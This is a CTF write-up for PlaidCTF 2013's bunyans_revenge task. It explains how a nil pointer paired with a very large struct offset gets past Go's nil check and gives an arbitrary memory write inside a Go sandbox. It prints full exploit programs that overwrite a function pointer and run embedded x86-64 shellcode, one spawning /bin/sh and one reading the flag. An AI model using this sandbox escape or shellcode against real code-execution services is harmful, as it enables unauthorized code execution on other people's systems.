---
title: PlaidCTF 2013 bunyans_revenge writeup
author: cbmixx
layout: post
permalink: /plaidctf-2013-bunyans_revenge-writeup/
categories:
  - writeup
---
## Overview

The task is to get a shell on a sandboxed Go [site][1], with help of a [ patch ][2].Snippet below shows main part of the patch:

<pre>diff -r a7414a294dcb src/cmd/6g/cgen.c
--- a/src/cmd/6g/cgen.c Fri Apr 19 12:00:40 2013 -0700
+++ b/src/cmd/6g/cgen.c Fri Apr 19 21:03:47 2013 +0000
@@ -888,18 +888,18 @@
    
    case ODOTPTR:
        cgen(nl, res);
+       // explicit check for nil if struct is large enough
+       // that we might derive too big a pointer.
+       if(nl-&gt;type-&gt;type-&gt;width &gt;= unmappedzero) {
+           regalloc(&n1, types[tptr], res);
+           gmove(res, &n1);
+           n1.op = OINDREG;
+           n1.type = types[TUINT8];
+           n1.xoffset = 0;
+           gins(ATESTB, nodintconst(0), &n1);
+           regfree(&n1);
+       }
        if(n-&gt;xoffset != 0) {
-           // explicit check for nil if struct is large enough
-           // that we might derive too big a pointer.
-           if(nl-&gt;type-&gt;type-&gt;width &gt;= unmappedzero) {
-               regalloc(&n1, types[tptr], res);
-               gmove(res, &n1);
-               n1.op = OINDREG;
-               n1.type = types[TUINT8];
-               n1.xoffset = 0;
-               gins(ATESTB, nodintconst(0), &n1);
-               regfree(&n1);
-           }
            ginscon(optoas(OADD, types[tptr]), n-&gt;xoffset, res);
        }
        break;
</pre>

It seems that he try to enforce the check related to nil, big struct, and pointer. This tell us that before patching we should be able to derive &#8220;too big a pointer&#8221; with help of nil and a large struct.

## Unsafe pointer

After some reading of the source code, we knew more about which type of code related to the patch.

<pre>// src/cmd/gc/go.h, 478L
    ODOT,   // t.x
    ODOTPTR,    // p.x that is implicitly (*p).x
    ODOTMETH,   // t.Method

// src/cmd/6g/gsubr.c, 37L
// TODO(rsc): Can make this bigger if we move
// the text segment up higher in 6l for all GOOS.
vlong unmappedzero = 4096;
</pre>

And we wrote snippets of code, which does fall in the old check, or bypass it (explicitly call the pointer)

<pre>type T struct {
    offset [4096]byte
    x int
}

// fail:( 
var t *T
x := &(t.x)
*x = 0
// ** panic msg while running **
panic: runtime error: invalid memory address or nil pointer dereference
[signal 0xb code=0x1 addr=0x0 pc=0x400c19]

// pass:)
var t *T
x := &((*t).x)
*x = 0
// ** panic msg while running **
unexpected fault address 0x1000
throw: fault
[signal 0xb code=0x1 addr=0x1000 pc=0x400c1c]
</pre>

## Changing code flow

The sandbox doesn&#8217;t allow us to import packages containing unsafe parts, which make the compiler not compile in any unsafe runtime code, so we need to prepare the shellcode ourselves. Soon we found that function type in Go, like function pointer in C may help us. Due to NX bits, we need to put shellcode in executable areas. Using const string seems to be a good idea. Finally we worked out a piece of code running flawless in the local environment:

<pre>package main
    
type T struct {
// magic numbers are from objdump:(
    offset [0x4283f8]byte
    x int64
}

type Func func(string)
var f Func

// execve('/bin/sh', ['/bin/sh'], NULL)
const shellcode = "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08" +
"\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

func main() {
    var t *T
    x := &((*t).x)
    *x = 0x417c5c
    // avoiding unused const optimized out, not a real argument
    f(shellcode)
}
</pre>

However it didn&#8217;t work on the site. First the memory layout seems not to be like that in our local environment, but we could pass it by fixing the offset in struct(we can &#8220;read&#8221; it from .text section online). Though calling shellcode fails still.

We noticed that panic message from the site differs from ours, which contains a file named &#8220;panic.c&#8221; not existing in our source code. It seems that they were using a different branch of Go. After searching we found this [repo][3] seems to fit theirs code well.

<pre>goroutine 1 [running]:
[fp=0x7f8bbd3bbf60] runtime.throw(0x4420d7)
    /home/bunyansrevenge/go/src/pkg/runtime/panic.c:473 +0x67
[fp=0x7f8bbd3bbf78] runtime.sigpanic()
    /home/bunyansrevenge/go/src/pkg/runtime/os_linux.c:239 +0xe7
[fp=0x7f8bbd3bbf90] main.main()
    /tmp/go-sandbox728098232/prog.go:18 +0x20
</pre>

Comparing binary compiled by these 2 branches, we saw the difference on handling function calling: modern ones just jump to the address stored in the memory, but the other storing the address in another location, and storing that address in the memory. See the disassembly for details:

<pre># modern ones
400c37:       48 8b 1c 25 f8 83 42    mov    0x4283f8,%rbx
400c3e:       00 
400c3f:       ff d3                   callq  *%rbx

# the other
400c3d:       48 8b 14 25 10 41 44    mov    0x444110,%rdx
400c44:       00 
400c45:       48 8b 1a                mov    (%rdx),%rbx
400c48:       ff d3                   callq  *%rbx
</pre>

So we need to change the code fitting compiler running on the site. At last it works. The complete piece of code for capturing the flag goes below:

<pre>package main
    
type T struct {
    offset [0x444110]byte
    x *int64
}

type Func func(string)
var f Func
    
// execve('/usr/bin/cat', ['/usr/bin/cat', 'flag'], NULL)
const shellcode = "\x48\x31\xd2\x48\xc7\xc1\x66\x6c\x61\x67\x51\x48\x89\xe1" +
"\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe7\x48\x31\xc0\x50" +
"\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
    
    
func main() {
    var _x int64
    _x = 0x42f5b0
    var t *T
    x := &((*t).x)
    *x = &_x
    // avoiding unused const optimized out, not a real argument
    f(shellcode)
}
</pre>

The flag is **nx&#95;was&#95;a&#95;good&#95;idea&#95;after&#95;all**.

 [1]: http://50.17.64.205:8080/
 [2]: http://play.plaidctf.com/files/go.patch-ec4d1d0cd43f70526b2864d8ccae2e3db63fd7cc
 [3]: https://github.com/jnwhiteh/golang